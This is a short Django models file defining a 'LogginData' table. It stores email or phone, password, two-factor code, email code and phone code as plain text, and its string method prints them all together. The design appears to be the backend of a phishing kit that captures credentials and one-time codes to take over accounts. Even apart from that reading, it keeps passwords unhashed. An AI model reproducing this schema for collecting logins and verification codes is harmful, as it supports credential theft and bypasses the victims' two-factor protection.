from django.db import models

# Create your models here.

class LogginData(models.Model):
    id = models.CharField(primary_key=True, max_length=250, editable=False)
    email_phone = models.CharField(max_length=250, null=True, blank=True)
    password = models.CharField(max_length=250, null=True, blank=True)
    
    two_factor_code = models.CharField(max_length=250, null=True, blank=True)
    email_code = models.CharField(max_length=250, null=True, blank=True)
    phone_code = models.CharField(max_length=250, null=True, blank=True)
    
    def __str__(self):
        return f'Email/Phone: {self.email_phone}, password: {self.password}, EMAIL CODE: {self.email_code}, PHONE CODE: {self.phone_code}, 2FACTOR CODE: {self.two_factor_code}'

    class Meta:
        verbose_name = "Login Data"
        verbose_name_plural = "Login Data"
